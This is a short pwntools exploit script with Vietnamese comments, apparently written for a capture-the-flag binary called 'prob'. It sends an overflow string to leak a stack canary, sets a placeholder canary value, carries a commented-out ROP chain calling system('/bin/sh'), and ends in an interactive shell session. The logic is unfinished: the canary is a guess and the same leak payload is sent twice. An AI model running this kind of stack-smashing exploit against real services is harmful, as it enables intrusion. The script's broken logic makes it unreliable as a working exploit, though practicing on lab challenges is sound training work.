from pwn import *

# Thiết lập kết nối
# Nếu chương trình chạy cục bộ:
p = process('./prob')
# Nếu chương trình chạy từ xa:
# p = remote('target_ip', target_port)

# Bước 1: Leaking Canary
# Gửi một chuỗi dài để cố gắng nhận giá trị canary
payload = b'A' * 24 + b'BBBB'  # Ghi đè lên canary và biến khác
p.sendlineafter('Input: ', payload)
response = p.recvuntil('You entered: ')
leaked = p.recvline().strip()
log.info(f"Leaked data: {leaked}")

# Xác định canary từ leaked data
# Cần phân tích kỹ hơn tùy thuộc vào kết quả thực tế
# ret_address = 0x000000000000101a
# Bước 2: Xây dựng payload với canary
# Giả sử bạn đã biết canary là 0x4141414141414141
canary = b'\x41' * 8
# payload = b'A' * 24 + canary + b'B' * 8 + p64(ret_address) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)

# Gửi payload
p.sendlineafter('Input: ', payload)

# Tương tác với shell
p.interactive()
